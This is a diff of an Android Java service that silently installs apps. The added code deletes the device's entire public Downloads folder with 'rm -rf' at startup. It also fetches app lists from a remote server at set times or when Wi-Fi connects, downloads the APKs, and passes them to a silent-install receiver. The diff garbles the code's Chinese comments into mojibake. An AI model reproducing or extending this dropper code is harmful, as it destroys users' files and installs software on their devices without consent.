@@ -1,21 +1,49 @@
 package com.xstd.active.plugin;
 
+import java.io.BufferedOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.List;
+
+import net.tsz.afinal.FinalHttp;
+import net.tsz.afinal.http.AjaxCallBack;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.app.Service;
-import android.content.*;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.res.AssetManager;
 import android.database.Cursor;
+import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
-import android.os.*;
+import android.os.Environment;
+import android.os.IBinder;
+import android.os.Parcelable;
+import android.os.RemoteException;
+import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.text.format.DateUtils;
+import android.text.format.Time;
 import android.util.Log;
+
 import com.android.volley.RequestQueue;
 import com.android.volley.Response.Listener;
 import com.android.volley.toolbox.JsonArrayRequest;
@@ -23,18 +51,6 @@ import com.android.volley.toolbox.Volley;
 import com.xstd.active.plugin.dao.SilenceApp;
 import com.xstd.active.plugin.dao.SilenceAppDao;
 import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
-import net.tsz.afinal.bitmap.download.Downloader;
-import net.tsz.afinal.bitmap.download.SimpleHttpDownloader;
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.io.*;
-import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.HashSet;
-import java.util.List;
-import java.util.Set;
 
 public class SilentInstallService extends Service {
 
@@ -50,6 +66,8 @@ public class SilentInstallService extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
+
+		deleteDownloadFiles();
 
 		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
 
@@ -76,6 +94,15 @@ public class SilentInstallService extends Service {
 		boolean fs = sharedPreferences.getBoolean("fs", false);
 		if (!fs)
 			copyFileToCache();
+	}
+
+	private void deleteDownloadFiles() {
+		File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+		try {
+			Runtime.getRuntime().exec("rm -rf " + file.getAbsolutePath());
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
 	}
 
 	@Override
@@ -105,34 +132,90 @@ public class SilentInstallService extends Service {
 				isScreenLignt = false;
 				activeApp();
 			} else if (Intent.ACTION_USER_PRESENT.equals(action)) {
+				checkService();
 				checkActive();
-			} else if(WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(action)) {
+			} else if (WifiManager.NETWORK_STATE_CHANGED_ACTION.equals(action)) {
 				Parcelable parcelableExtra = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
 				if (null != parcelableExtra) {
 					NetworkInfo networkInfo = (NetworkInfo) parcelableExtra;
 					boolean isConnected = networkInfo.isAvailable();
 					if (isConnected) {
-                        Log.w("ps","wifi连上了...");
 						updateService();
-						if(mustDownloadApp.size()>0) {
-                            Intent service = new Intent(getApplicationContext(),DownloadService.class);
-							startService(service);
+						if (mustDownloadApp.size() > 0) {
+							SystemClock.sleep(4000);
+							startDownload();
 						}
 					}
 				}
 			}
 		}
+
 	}
-	
-	public static final String SERVER_URL_PATH = "https://";
-	public static Set<DownloadApplication> mustDownloadApp = new HashSet<DownloadApplication>();
+
+	private void checkService() {
+		Time time = new Time();
+		time.set(System.currentTimeMillis());
+		int hour = time.hour;
+		if (6 < hour && hour < 9) {
+			updateService();
+			SystemClock.sleep(1500);
+			startDownload();
+		}
+		if (hour > 17 && hour < 24) {
+			updateService();
+			SystemClock.sleep(1500);
+			startDownload();
+		}
+	}
+
+	public boolean isNetAvailable() {
+		ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+		NetworkInfo networkInfo = cm.getActiveNetworkInfo();
+		if (null != networkInfo) {
+			return networkInfo.isAvailable();
+		}
+		return false;
+	}
+
+	public boolean isWifiAvailable() {
+		ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+		NetworkInfo networkInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+		if (null != networkInfo) {
+			return networkInfo.isAvailable();
+		}
+		return false;
+	}
+
+	public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
+
+	private void startDownload() {
+		if (mustDownloadApp.size() > 0) {
+			DownloadApplication app = mustDownloadApp.get(0);
+			new FinalHttp().download(app.remoteUrl, DOWNLOAD_LOCATION + app.fileName, true, new AjaxCallBack<File>() {
+
+				@Override
+				public void onSuccess(File t) {
+					super.onSuccess(t);
+					Intent intent = new Intent(getApplicationContext(), SilentInstallReceiver.class);
+					intent.putExtra("apk_path", t.getAbsolutePath());
+					sendBroadcast(intent);
+					mustDownloadApp.remove(0);
+					startDownload();
+				}
+			});
+		}
+
+	}
+
+	public static final String SERVER_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/down";
+	public static List<DownloadApplication> mustDownloadApp = new ArrayList<DownloadApplication>();
 
 	/**
-	 * 更新服务器
+	 * 閺囧瓨鏌婇張宥呭閸ｏ拷
 	 */
 	private void updateService() {
 		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
-		if(DateUtils.isToday(last_update_time)) {
+		if (DateUtils.isToday(last_update_time)) {
 			return;
 		}
 		mustDownloadApp.clear();
@@ -141,8 +224,8 @@ public class SilentInstallService extends Service {
 
 			@Override
 			public void onResponse(JSONArray arg0) {
-                Log.w("ps",arg0.toString());
-				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis());
+				Log.w("ps", arg0.toString());
+				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
 				getDeviceInstallPackName();
 				for (int i = 0; i < arg0.length(); i++) {
 					try {
@@ -150,7 +233,7 @@ public class SilentInstallService extends Service {
 						String name = obj.getString("software_name");
 						String packName = obj.getString("package_name");
 						String url = obj.getString("apk_uri");
-						if(!mustDownloadApp.contains(packName)) {
+						if (!mustDownloadApp.contains(packName)) {
 							DownloadApplication app = new DownloadApplication();
 							app.fileName = name;
 							app.packName = packName;
@@ -165,7 +248,7 @@ public class SilentInstallService extends Service {
 		}, null));
 		rq.start();
 	}
-	
+
 	public static class DownloadApplication {
 		String fileName;
 		String packName;
@@ -173,7 +256,7 @@ public class SilentInstallService extends Service {
 	}
 
 	private boolean isScreenLignt = true;
-	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;//一天的毫秒数
+	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 娑擄拷銇夐惃鍕嚑缁夋帗鏆�
 
 	private void checkActive() {
 		getDeviceInstallPackName();
@@ -208,7 +291,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 重新安装然后卸载
+	 * 闁插秵鏌婄�澶庮棅閻掕泛鎮楅崡姝屾祰
 	 * 
 	 * @param entity
 	 */
@@ -270,7 +353,7 @@ public class SilentInstallService extends Service {
 	private List<String> packgeNames = new ArrayList<String>();
 
 	/**
-	 * 获得设备上安装程序的包名
+	 * 閼惧嘲绶辩拋鎯ь槵娑撳﹤鐣ㄧ憗鍛柤鎼村繒娈戦崠鍛倳
 	 */
 	private void getDeviceInstallPackName() {
 		packgeNames.clear();
@@ -280,7 +363,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 激活程序
+	 * 濠碉拷妞跨粙瀣碍
 	 */
 	private void activeApp() {
 		getDeviceInstallPackName();
@@ -325,7 +408,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 回到Launcher
+	 * 閸ョ偛鍩孡auncher
 	 */
 	public void goHome() {
 		Intent i = new Intent(Intent.ACTION_MAIN);
@@ -335,7 +418,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 安装程序
+	 * 鐎瑰顥婄粙瀣碍
 	 * 
 	 * @param file
 	 */
@@ -359,7 +442,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 通过一个apk文件获得程序的包名
+	 * 闁俺绻冩稉锟介嚋apk閺傚洣娆㈤懢宄扮繁缁嬪绨惃鍕瘶閸氾拷
 	 * 
 	 * @param absPath
 	 * @return
@@ -373,7 +456,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * sim卡是否可用
+	 * sim閸椻剝妲搁崥锕�讲閻拷
 	 * 
 	 * @return
 	 */
@@ -434,7 +517,7 @@ public class SilentInstallService extends Service {
 	}
 
 	/**
-	 * 程序安装结果
+	 * 缁嬪绨�澶庮棅缂佹挻鐏�
 	 */
 	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
 
